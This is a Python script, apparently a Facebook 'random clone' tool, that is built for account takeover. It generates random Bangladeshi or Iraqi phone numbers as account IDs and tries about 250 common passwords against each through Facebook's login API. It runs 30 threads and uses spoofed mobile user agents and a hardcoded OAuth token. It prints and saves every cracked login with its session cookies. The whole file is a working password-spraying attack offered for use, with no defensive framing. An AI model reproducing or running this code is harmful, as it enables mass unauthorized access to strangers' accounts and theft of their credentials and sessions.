#shadow
#mueid mursalin Rifat
import os
try:
    import requests,rich,bs4,fake_useragent
except:
    os.system('pip install requests && pip install rich')
from rich import print
from rich.console import Console
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import random
import string
import uuid
import time
import sys
import re
#--------shadow---------------#
R="[bold red]"
G="[bold green]"
Y="[bold yellow]"
B="[bold blue]"
M="[bold magenta]"
P="[bold violet]"
C="[bold cyan]"
W="[bold purple]"
r="\033[1;31m"
g="\033[1;32m"
y="\033[1;33m"
b="\033[1;34m"
m="\033[1;35m"
c="\033[1;36m"
w="\033[1;37m"
X = "[bold green]<[bold white]★[bold green]>[bold white]"

#

os.system('xdg-open https://t.me/shadowfk0')
#---------shadow--------------#
logo = Panel(f"""
{W}
{P}                 C C C      A      T T T      X   X
{B}                C          A A       T         X X
{P}                C         A   A      T          X
{B}                C        AAAAAAA     T         X X
{P}                 C C C  A       A    T        X   X
{W}
{W}─────────────────────────────────────
{W} 𝙽𝚘𝚝 𝚌𝚘𝚍𝚎𝚍 𝚝𝚘 𝚒𝚖𝚙𝚛𝚎𝚜𝚜. 𝙲𝚘𝚍𝚎𝚍 𝚝𝚘 𝚎𝚡𝚙𝚛𝚎𝚜𝚜.🖤      
{W}─────────────────────────────────────
{W}[{G}×{W}] DEVELOPER {W}:{G} MUEID MURSALIN RIFAT
{W}[{G}×{W}] STATUS    {W}:{G} ACTIVE✅
{W}[{G}×{W}] VERSION   {W}:{G} V1.0
{W}[{G}×{W}] TOOL~X    {W}:{G} RANDOM CLONE
{W}─────────────────────────────────────""",

border_style="green1")


#-----------shadow------------#
def clear():
    os.system('clear')
#-----------catx------------#
def linex():
    print(f"{W}———————————————————————————————")
#-------------rifat----------#
live = 0
cp = 0
loop = 0
numx = []
console = Console()
#------------shadow-----------#
def ugenX():
    android_version = random.randint(10, 13)  # Random Android version
    build_number = f"QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}"
    # Fixed device details from your provided UA
    density = 2.75
    width, height = 1080, 2220  
    # Random Facebook app version and build version
    fb_versions = [
        ("335.0.0.28.118", "316527966", "317757053"),
        ("347.0.0.3.161", "229145646", "318734599"),
        ("350.0.0.8.89", "318734599", "320456789")
    ]
    fb_version, fb_build, fb_rv = random.choice(fb_versions)
    # Generate User-Agent
    user_agent = (
        f"Mozilla/5.0 (Linux; Android {android_version}; Build/{build_number}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Mobile Safari/537.36 "
        f"[FBAN/FB4A;FBAV/{fb_version};FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/{fb_build};"
        f"FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/{android_version};"
        f"FBCA/armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};"
        f"FB_FW/1;FBRV/{fb_rv};]"
    )
    return user_agent

# save shadow.txt file ids
def save_to_file(uid, pw):
    try:
        with open("/sdcard/shadow.txt", "a") as f:
            f.write(f"{uid}|{pw}\n")
    except Exception as e:
        pass

def generate_random_passwords(uid):
    """Generate about 250+ random password combinations with names and numbers"""
    base_passwords = [
        uid, uid[:6], uid[:7], uid[:8], uid[5:],  # Original patterns
        uid[:4], uid[-6:], uid[-4:], uid[2:8], uid[3:9]  # Additional number patterns
    ]
    
    # Common names list (Bangladeshi and international)
    names = [
        "rifat", "mueid", "mursalin", "shadow", "catx", "shanto", "sakib", "tamim", "mushfiq", 
        "mahmud", "taskin", "mustafiz", "liton", "mehedi", "nasir", "jahid", "hasan", "hossain",
        "karim", "rahim", "abdul", "mohammad", "ahmed", "ali", "imran", "faruk", "raihan", "rahat",
        "shahriar", "tanvir", "nabil", "fahim", "arif", "rasel", "sumon", "jony", "bappi", "rana",
        "shuvo", "emon", "siam", "rayhan", "sabbir", "mamun", "rashed", "sohel", "jamal", "kamal",
        "john", "michael", "david", "robert", "william", "james", "christopher", "daniel", "matthew",
        "anthony", "mark", "donald", "steven", "paul", "andrew", "joshua", "kevin", "brian", "george",
        "mary", "patricia", "jennifer", "linda", "elizabeth", "barbara", "susan", "jessica", "sarah",
        "karen", "nancy", "lisa", "betty", "sandra", "margaret", "ashley", "kimberly", "emily", "donna"
    ]
    
    # Password patterns with names
    name_patterns = []
    for name in random.sample(names, 50):  # Use 50 random names
        name_patterns.extend([
            name,
            name + "123",
            name + "1234",
            name + "12345",
            name + "123456",
            name + "1122",
            name + "1234567",
            name + "12345678",
            name + "123456789",
            name + "007",
            name + "100",
            name + "2000",
            name + "2020",
            name + "2021",
            name + "2022",
            name + "2023",
            name + "2024",
            name + "1",
            name + "12",
            name + "123!",
            name + "@123",
            name + "#123",
            name + "123$",
            name.capitalize(),
            name.capitalize() + "123",
            name.capitalize() + "1234",
            name.upper(),
            name.upper() + "123",
            name + str(random.randint(1, 999)),
            name + str(random.randint(1000, 9999)),
            name + str(random.randint(10000, 99999)),
        ])
    
    # Additional random patterns
    additional_patterns = [
        "password", "password123", "pass123", "hello", "hello123", "world", "world123",
        "bangladesh", "bangladesh123", "dhaka", "dhaka123", "chittagong", "ctg123",
        "love", "love123", "iloveyou", "facebook", "fb123", "instagram", "insta123",
        "admin", "admin123", "user", "user123", "test", "test123", "demo", "demo123",
        "123456", "12345678", "123456789", "1234567890", "111111", "222222", "333333",
        "444444", "555555", "666666", "777777", "888888", "999999", "000000",
        "012345", "0123456", "01234567", "012345678", "0123456789",
        "654321", "6543210", "987654", "987654321", "112233", "445566", "778899",
        "aabbcc", "abc123", "abcd1234", "abcde12345", "abcdef123456",
        "qwerty", "qwerty123", "qwertyuiop", "asdfgh", "asdfgh123", "zxcvbn", "zxcvbn123",
        "!@#$%", "!@#$%^", "!@#$%^&", "!@#$%^&*", "1qaz2wsx", "1q2w3e4r", "1q2w3e4r5t",
        "123qwe", "1234qwer", "12345qwert", "qwe123", "qwer1234", "qwert12345",
    ]
    
    # Combine all password patterns
    all_passwords = base_passwords + name_patterns[:150] + additional_patterns
    
    # Remove duplicates and limit to about 250 passwords
    unique_passwords = list(set(all_passwords))
    return unique_passwords[:250]

def crack(uid, pwx):
    global live, loop
    try:
        # Generate random passwords for this UID
        random_passwords = generate_random_passwords(uid)
        # Combine with original passwords
        all_passwords = list(set(pwx + random_passwords))
        
        for pw in all_passwords:
            sys.stdout.write(f'\r{w}[{b}➤{w}] {y}CLONING IDS {w}[{g}{loop}{w}]<>[SHADOW_OK:{g}{live}{w}]\r')
            sys.stdout.flush()
            data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': uid,'password': pw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
            headers = {'User-Agent': ugenX(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
            url = 'https://b-graph.facebook.com/auth/login'
            try:
                response = requests.post(url,data=data,headers=headers,allow_redirects=False).json()
                if 'session_key' in response:
                    coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                    console.print(Panel(f"[bold green1]{uid} | {pw}\n[bold green1]cookies : {coki}"))
                    
                    save_to_file(uid, pw)
                    live+=1
                    break
                elif 'www.facebook.com' in response['error']['message']:
                    console.print(Panel(f"[bold yellow]{uid} | {pw}"))
                    
                    break
            except Exception as e:
                pass
        loop+=1
    except Exception as e:
        pass

def main():
    clear()
    console.print(logo)
    console.print(Panel("Choose Country:\n[1] Bangladesh (017~018~019~016)\n[2] Iraq (Korek~Asia~Zain)", style="bold green1"))
    # Custom bottom-styled input
    console.print(" ~ SHADOW🖤 ~")
    country_choice = console.input(" ~➤ ")
    
    clear()
    console.print(logo)
    
    if country_choice == "1":
        # Bangladesh numbers
        console.print(Panel("Bangladesh Codes: 017~018~019~016", style="bold green1"))
        console.print(" ~ SHADOW🖤 ~")
        code = console.input(" ~➤ ")
        clear()
        console.print(logo)
        console.print(Panel('1000~5000~9999',style="bold green1"))
        console.print(" ~ SHADOW🖤 ~")
        limit = int(console.input(" ~➤ "))
        for _ in range(limit):
            num = ''.join(random.choice(string.digits) for _ in range(8))
            numx.append(num)
            
    elif country_choice == "2":
        # Iraq numbers
        console.print(Panel("Iraqi Carriers:\n[1] Korek (075)\n[2] Asia Cell (077)\n[3] Zain (079)", style="bold green1"))
        console.print(" ~ SHADOW🖤 ~")
        carrier_choice = console.input(" ~➤ ")
        
        if carrier_choice == "1":
            code = "075"  # Korek
        elif carrier_choice == "2":
            code = "077"  # Asia Cell
        elif carrier_choice == "3":
            code = "079"  # Zain
        else:
            code = "075"  # Default to Korek
            
        clear()
        console.print(logo)
        console.print(Panel('1000~5000~9999',style="bold green1"))
        console.print(" ~ SHADOW🖤 ~")
        limit = int(console.input(" ~➤ "))
        for _ in range(limit):
            # Iraqi numbers are typically 8 digits after code
            num = ''.join(random.choice(string.digits) for _ in range(8))
            numx.append(num)
    else:
        # Default to Bangladesh
        console.print(Panel("Bangladesh Codes: 017~018~019~016", style="bold green1"))
        console.print(" ~ SHADOW🖤 ~")
        code = console.input(" ~➤ ")
        clear()
        console.print(logo)
        console.print(Panel('1000~5000~9999',style="bold green1"))
        console.print(" ~ SHADOW🖤 ~")
        limit = int(console.input(" ~➤ "))
        for _ in range(limit):
            num = ''.join(random.choice(string.digits) for _ in range(8))
            numx.append(num)

    with tred(max_workers=30) as RIFAT:
        clear()
        console.print(logo)
        console.print(Panel(f"{X} COUNTRY: {'Iraq' if country_choice == '2' else 'Bangladesh'}\n{X} CODE : {code}\n{X} CLONE_LIMIT : {limit}\n{X} RANDOM CLONING STARTED✅ "))
        for sex in numx:
            uid = code+sex
            pwx = [sex,uid,uid[:6],uid[:7],uid[:8],uid[5:]]
            RIFAT.submit(crack,uid,pwx)

main()
#shadowxrandom
